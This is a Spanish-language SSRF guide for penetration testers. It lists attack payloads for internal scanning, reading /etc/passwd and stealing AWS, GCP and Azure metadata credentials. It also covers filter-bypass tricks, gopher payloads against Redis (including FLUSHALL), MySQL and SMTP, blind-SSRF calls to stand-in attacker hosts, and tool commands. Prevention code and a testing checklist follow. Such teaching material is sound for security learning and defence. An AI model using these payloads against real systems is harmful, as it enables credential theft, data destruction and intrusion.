# Server-Side Request Forgery (SSRF)

## ¿Qué es SSRF?

SSRF es una vulnerabilidad que permite a un atacante hacer que el servidor realice requests HTTP a una ubicación arbitraria, pudiendo acceder a recursos internos o realizar acciones en nombre del servidor.

## Tipos de SSRF

### Regular SSRF
La respuesta del servidor se muestra al atacante.

```
http://vulnerable.com/fetch?url=http://internal-server/admin
```

### Blind SSRF
No se muestra la respuesta, pero se puede detectar por comportamiento (timing, errores, logs).

```
http://vulnerable.com/webhook?url=http://attacker.com/log
```

## Casos de Uso Comunes

### 1. Escaneo de red interna
```
http://vulnerable.com/fetch?url=http://192.168.1.1
http://vulnerable.com/fetch?url=http://192.168.1.1:22
http://vulnerable.com/fetch?url=http://192.168.1.1:3306
```

### 2. Acceso a servicios internos
```
http://vulnerable.com/fetch?url=http://localhost:8080/admin
http://vulnerable.com/fetch?url=http://127.0.0.1/server-status
http://vulnerable.com/fetch?url=http://metadata.google.internal/
```

### 3. Leer archivos locales
```
http://vulnerable.com/fetch?url=file:///etc/passwd
http://vulnerable.com/fetch?url=file:///c:/windows/win.ini
```

### 4. Cloud Metadata
```
# AWS
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://vulnerable.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/
http://vulnerable.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://vulnerable.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## Payloads de Explotación

### Bypass de filtros básicos

#### Bypass localhost blacklist
```
# Usando 127.0.0.1
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443

# Alternativas a localhost
http://127.1
http://0.0.0.0
http://[::1]
http://localhost.localdomain

# Usando @ 
http://user@127.0.0.1
http://vulnerable.com@127.0.0.1

# URL encoding
http://127.0.0.1 → http://127.0.0%2e1
http://localhost → http://local%68ost

# Octal/Hex
http://0177.0.0.1 (octal)
http://0x7f.0x0.0x0.0x1 (hex)
http://2130706433 (decimal)

# CNAME
http://localtest.me (resolves to 127.0.0.1)
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
```

#### Bypass domain whitelist
```
# Subdomain
http://attacker.whitelisted-domain.com

# Path confusion
http://whitelisted.com@attacker.com
http://attacker.com#whitelisted.com
http://attacker.com?whitelisted.com

# Open redirect en dominio whitelisted
http://whitelisted.com/redirect?url=http://attacker.com
```

#### Bypass con protocolo diferente
```
file:///etc/passwd
dict://localhost:6379/info
gopher://localhost:6379/_FLUSHALL
ldap://localhost:389
sftp://localhost:22
tftp://localhost:69
```

### Gopher Protocol (Multipurpose)

#### Redis
```
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a
```

#### MySQL
```gopher://localhost:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00
```

#### SMTP
```
gopher://localhost:25/_EHLO%20attacker.com%0AMAIL%20FROM%3A%3Cattacker@evil.com%3E%0ARCPT%20TO%3A%3Cvictim@victim.com%3E%0ADATA%0ASubject%3A%20SSRF%0A%0AThis%20is%20SSRF%0A.%0AQUIT
```

## AWS Metadata Exploitation

### Obtener credenciales
```bash
# Listar roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Obtener credenciales del rol
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Respuesta:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

### Información útil
```
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### IMDSv2 (require token)
```bash
# Obtener token (si SSRF permite POST)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# Usar token
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

## Google Cloud Metadata

### Obtener access token
```
# Requiere header específico
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

# Bypass header requirement (si posible)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?recursive=true&alt=json
```

### Información útil
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

## Azure Metadata

### Obtener access token
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

### Información útil
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
```

## Testing para SSRF

### 1. Identificar puntos de entrada
```
- URL parameters: ?url=, ?path=, ?dest=, ?redirect=
- File upload (via URL)
- Import from URL
- Webhooks
- PDF generators
- Image processing
- APIs que hacen HTTP requests
```

### 2. Test básico
```bash
# Tu servidor
python3 -m http.server 8000

# En la app vulnerable
http://vulnerable.com/fetch?url=http://YOUR-IP:8000

# Verifica si recibes la request
```

### 3. Test Blind SSRF
```bash
# Burp Collaborator
http://vulnerable.com/webhook?url=http://BURP-COLLABORATOR.com

# Requestbin
http://vulnerable.com/webhook?url=http://requestbin.net/r/xxxxx

# Interactsh
interactsh-client
http://vulnerable.com/webhook?url=http://xxxxx.interact.sh
```

### 4. Time-based detection
```python
import time
import requests

# Request que debería tardar
start = time.time()
requests.get('http://vulnerable.com/fetch?url=http://internal-slow-service:8080')
elapsed = time.time() - start

if elapsed > 5:
    print("Posible SSRF - servicio interno respondió")
```

## Herramientas

### SSRFmap
```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Test básico
python3 ssrfmap.py -r request.txt -p url -m portscan

# AWS metadata
python3 ssrfmap.py -r request.txt -p url -m aws
```

### Gopherus
Genera payloads de Gopher para explotar servicios internos.

```bash
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
chmod +x gopherus.py

# MySQL
./gopherus.py --exploit mysql

# Redis
./gopherus.py --exploit redis

# SMTP
./gopherus.py --exploit smtp
```

### Interactsh
```bash
# Cliente
interactsh-client

# Usar URL generada en pruebas
http://vulnerable.com/fetch?url=http://xxxxx.interact.sh
```

## Prevención

### 1. Whitelist de hosts permitidos
```python
# Python
ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']

def fetch_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError('Host not allowed')
    return requests.get(url)
```

### 2. Blacklist de rangos internos
```python
import ipaddress

def is_private_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback
    except:
        return False

def fetch_url(url):
    parsed = urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)
    
    if is_private_ip(ip):
        raise ValueError('Private IP not allowed')
    
    return requests.get(url)
```

### 3. Deshabilitar redirects
```python
# Python
response = requests.get(url, allow_redirects=False)

# PHP
$opts = array(
    'http' => array(
        'follow_location' => false
    )
);
$context = stream_context_create($opts);
file_get_contents($url, false, $context);
```

### 4. Deshabilitar protocolos peligrosos
```python
# Python/requests solo permite HTTP/HTTPS por defecto

# PHP
$allowed_schemes = ['http', 'https'];
$parsed = parse_url($url);
if (!in_array($parsed['scheme'], $allowed_schemes)) {
    die('Scheme not allowed');
}
```

### 5. Network segmentation
```
- Servidor web en DMZ
- Servicios internos en red privada
- Firewall rules estrictas
- No permitir conexiones desde DMZ a red interna
```

### 6. DNS resolution segura
```python
import socket
import ipaddress

def safe_resolve(hostname):
    ip = socket.gethostbyname(hostname)
    ip_obj = ipaddress.ip_address(ip)
    
    # Bloquear IPs privadas
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
        raise ValueError('Private IP not allowed')
    
    return ip
```

### 7. IMDSv2 en AWS
```bash
# Requerir IMDSv2 (requiere token)
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

## Impacto

**Crítico:**
- Acceso a cloud metadata (credenciales)
- RCE vía servicios internos (Redis, etc.)
- Acceso a servicios de administración

**Alto:**
- Escaneo de red interna
- Acceso a servicios internos
- Bypass de firewalls

**Medio:**
- Information disclosure
- Port scanning

## Checklist de Testing

- [ ] Identificar parámetros que aceptan URLs
- [ ] Test con tu servidor web
- [ ] Intentar acceder a localhost
- [ ] Intentar acceder a 127.0.0.1
- [ ] Probar diferentes bypasses
- [ ] Intentar acceder a metadata (169.254.169.254)
- [ ] Probar diferentes protocolos (file://, gopher://)
- [ ] Test blind SSRF con Burp Collaborator
- [ ] Documentar servicios accesibles
- [ ] Evaluar impacto real

## Notas Importantes

> [!WARNING]
> **Precauciones:**
> - No escanees toda la red interna indiscriminadamente
> - Ten cuidado con servicios destructivos (Redis FLUSHALL)
> - Documenta todos los servicios que descubras
> - Reporta inmediatamente si encuentras credenciales

> [!TIP]
> **Tips:**
> - Empieza con pruebas simples (tu servidor)
> - Usa Burp Collaborator para blind SSRF
> - Prueba múltiples bypasses
> - Documenta exactamente qué URLs funcionan
> - Incluye impacto específico en tu reporte

## Laboratorios de Práctica

- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [HackTheBox](https://www.hackthebox.eu/)
- [PentesterLab](https://pentesterlab.com/)

## Referencias

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
